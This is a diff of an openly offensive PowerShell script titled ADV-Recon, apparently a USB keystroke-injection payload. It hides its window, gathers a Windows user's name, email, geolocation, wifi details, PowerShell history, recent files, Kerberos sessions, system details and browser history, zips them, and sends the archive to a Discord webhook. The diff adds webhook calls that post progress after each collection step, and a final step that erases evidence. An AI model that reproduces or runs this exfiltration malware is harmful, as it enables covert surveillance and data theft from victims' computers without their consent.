@@ -1,22 +1,3 @@
-############################################################################################################################################################                      
-#                                  |  ___                           _           _              _             #              ,d88b.d88b                     #                                 
-# Title        : ADV-Recon         | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
-# Author       : I am Jakoby       |  | |   / _` | | '_ ` _ \   _  | |  / _` | | |/ /  / _ \  | '_ \  | | | |#              `Y8888888Y'                    #           
-# Version      : 2.0               |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               `Y888Y'                       #
-# Category     : Recon             | |___|  \__,_| |_| |_| |_|  \___/   \__,_| |_|\_\  \___/  |_.__/   \__, |#                 `Y'                         #
-# Target       : Windows 10,11     |                                                                   |___/ #           /\/|_      __/\\                  #     
-# Mode         : HID               |                                                           |\__/,|   (`\ #          /    -\    /-   ~\                 #             
-#                                  |  My crime is that of curiosity                            |_ _  |.--.) )#          \    = Y =T_ =   /                 #      
-#                                  |  and yea curiosity killed the cat                         ( T   )     / #   Luther  )==*(`     `) ~ \   Hobo          #                        
-#                                  |  but satisfaction brought him back                       (((^_(((/(((_/ #          /     \     /     \                #    
-#__________________________________|_________________________________________________________________________#          |     |     ) ~   (                #
-#  tiktok.com/@i_am_jakoby                                                                                   #         /       \   /     ~ \               #
-#  github.com/I-Am-Jakoby                                                                                    #         \       /   \~     ~/               #         
-#  twitter.com/I_Am_Jakoby                                                                                   #   /\_/\_/\__  _/_/\_/\__~__/_/\_/\_/\_/\_/\_#                     
-#  instagram.com/i_am_jakoby                                                                                 #  |  |  |  | ) ) |  |  | ((  |  |  |  |  |  |#              
-#  youtube.com/c/IamJakoby                                                                                   #  |  |  |  |( (  |  |  |  \\ |  |  |  |  |  |#
-############################################################################################################################################################
-                                                                                                                                                                                                                                               
 <#
 .SYNOPSIS
 	This is an advanced recon of a target PC and exfiltration of that data.
@@ -24,13 +5,19 @@
 	This program gathers details from target PC to include everything you could imagine from wifi passwords to PC specs to every process running.
 	All of the gather information is formatted neatly and output to a file.
 	That file is then exfiltrated to cloud storage via Dropbox.
-.Link
-      https://developers.dropbox.com/oauth-guide	    # Guide for setting up your Dropbox for uploads
-      https://www.youtube.com/watch?v=Zs-1j42ySNU           # My youtube tutorial on Discord Uploads 
-      https://www.youtube.com/watch?v=VPU7dFzpQrM           # My youtube tutorial on Dropbox Uploads
 #>
 
 ############################################################################################################################################################
+
+# Send a message to discord to signal the payload has started
+
+$payload = [PSCustomObject]@{
+    content = "Starting Recon on $env:COMPUTERNAME by $env:USERNAME with IP $(Test-Connection -ComputerName (hostname) -Count 1).IPV4Address.IPAddressToString"
+}
+Invoke-RestMethod -Uri $dc -Method Post -Body ($payload | ConvertTo-Json) -ContentType "application/json"
+
+
+
 
 $i = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
 add-type -name win -member $i -namespace native;
@@ -47,16 +34,6 @@ $ZIP = "$FolderName.zip"
 
 New-Item -Path $env:tmp/$FolderName -ItemType Directory
 
-############################################################################################################################################################
-
-# Enter your access tokens below. At least one has to be provided but both can be used at the same time. 
-
-#$db = ""
-
-#$dc = ""
-
-############################################################################################################################################################
-
 # Recon all User Directories
 tree $Env:userprofile /a /f >> $env:TEMP\$FolderName\tree.txt
 
@@ -64,7 +41,8 @@ tree $Env:userprofile /a /f >> $env:TEMP\$FolderName\tree.txt
 Copy-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Destination  $env:TEMP\$FolderName\Powershell-History.txt
 
 ############################################################################################################################################################
-
+$payload = [PSCustomObject]@{content = "Getting Full Name"}
+Invoke-RestMethod -Uri $dc -Method Post -Body ($payload | ConvertTo-Json) -ContentType "application/json"
 function Get-fullName {
 
     try {
@@ -86,7 +64,8 @@ function Get-fullName {
 $fullName = Get-fullName
 
 #------------------------------------------------------------------------------------------------------------------------------------
-
+$payload = [PSCustomObject]@{content = "Getting Email"}
+Invoke-RestMethod -Uri $dc -Method Post -Body ($payload | ConvertTo-Json) -ContentType "application/json"
 function Get-email {
     
     try {
@@ -108,7 +87,8 @@ $email = Get-email
 
 
 #------------------------------------------------------------------------------------------------------------------------------------
-
+$payload = [PSCustomObject]@{content = "Getting GeoLocation"}
+Invoke-RestMethod -Uri $dc -Method Post -Body ($payload | ConvertTo-Json) -ContentType "application/json"
 function Get-GeoLocation{
 	try {
 	Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
@@ -183,6 +163,8 @@ $StartUp = (Get-ChildItem -Path ([Environment]::GetFolderPath("Startup"))).Name
 ############################################################################################################################################################
 
 # Get nearby wifi networks
+$payload = [PSCustomObject]@{content = "Getting Nearby Wifi Networks"}
+Invoke-RestMethod -Uri $dc -Method Post -Body ($payload | ConvertTo-Json) -ContentType "application/json"
 
 try
 {
@@ -198,6 +180,9 @@ $NearbyWifi="No nearby wifi networks detected"
 # Get info about pc
 
 # Get IP / Network Info
+
+$payload = [PSCustomObject]@{content = "Getting Public IP"}
+Invoke-RestMethod -Uri $dc -Method Post -Body ($payload | ConvertTo-Json) -ContentType "application/json"
 
 try{$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content}
 catch{$computerPubIP="Error getting Public IP"}
@@ -217,6 +202,8 @@ if ((Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server").
 
 ############################################################################################################################################################
 
+$payload = [PSCustomObject]@{content = "Getting Computer Data / System Info"}
+Invoke-RestMethod -Uri $dc -Method Post -Body ($payload | ConvertTo-Json) -ContentType "application/json"
 #Get System Info
 $computerSystem = Get-CimInstance CIM_ComputerSystem
 
@@ -251,7 +238,8 @@ $klist = klist sessions
 $RecentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File | Sort-Object LastWriteTime -Descending | Select-Object -First 50 FullName, LastWriteTime
 
 ############################################################################################################################################################
-
+$payload = [PSCustomObject]@{content = "Getting HDDs"}
+Invoke-RestMethod -Uri $dc -Method Post -Body ($payload | ConvertTo-Json) -ContentType "application/json"
 # Get HDDs
 $driveType = @{
    2="Removable disk "
@@ -293,6 +281,9 @@ $listener = $listener | foreach-object {
 # service
 $service=Get-WmiObject win32_service | select State, Name, DisplayName, PathName, @{Name="Sort";Expression={$_.State + $_.Name}} | Sort-Object Sort | Format-Table State, Name, DisplayName, PathName | Out-String -width 250
 
+
+$payload = [PSCustomObject]@{content = "Getting Installed Software/Drivers/Video Card"}
+Invoke-RestMethod -Uri $dc -Method Post -Body ($payload | ConvertTo-Json) -ContentType "application/json"
 # installed software (get uninstaller)
 $software=Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize | Out-String -width 250
 
@@ -306,6 +297,9 @@ $videocard=Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcess
 ############################################################################################################################################################
 
 # OUTPUTS RESULTS TO LOOT FILE
+
+$payload = [PSCustomObject]@{content = "Outputting Results to File"}
+Invoke-RestMethod -Uri $dc -Method Post -Body ($payload | ConvertTo-Json) -ContentType "application/json"
 
 $output = @"
 
@@ -452,6 +446,8 @@ $output > $env:TEMP\$FolderName/computerData.txt
 
 ############################################################################################################################################################
 
+$payload = [PSCustomObject]@{content = "Getting Browser Data"}
+Invoke-RestMethod -Uri $dc -Method Post -Body ($payload | ConvertTo-Json) -ContentType "application/json"
 function Get-BrowserData {
 
     [CmdletBinding()]
@@ -498,24 +494,7 @@ Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\$FolderName\B
 ############################################################################################################################################################
 
 Compress-Archive -Path $env:tmp/$FolderName -DestinationPath $env:tmp/$ZIP
-
-# Upload output file to dropbox
-
-function dropbox {
-$TargetFilePath="/$ZIP"
-$SourceFilePath="$env:TEMP\$ZIP"
-$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-$authorization = "Bearer " + $db
-$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-$headers.Add("Authorization", $authorization)
-$headers.Add("Dropbox-API-Arg", $arg)
-$headers.Add("Content-Type", 'application/octet-stream')
-Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
-}
-
-if (-not ([string]::IsNullOrEmpty($db))){dropbox}
-
-############################################################################################################################################################
+###########################################################################################################################################
 
 function Upload-Discord {
 
@@ -545,7 +524,8 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:tmp/$ZIP"}
  
 
 ############################################################################################################################################################
-
+$payload = [PSCustomObject]@{content = "Erasing Evidence"}
+Invoke-RestMethod -Uri $dc -Method Post -Body ($payload | ConvertTo-Json) -ContentType "application/json"
 <#
 .NOTES 
 	This is to clean up behind you and remove any evidence to prove you were there
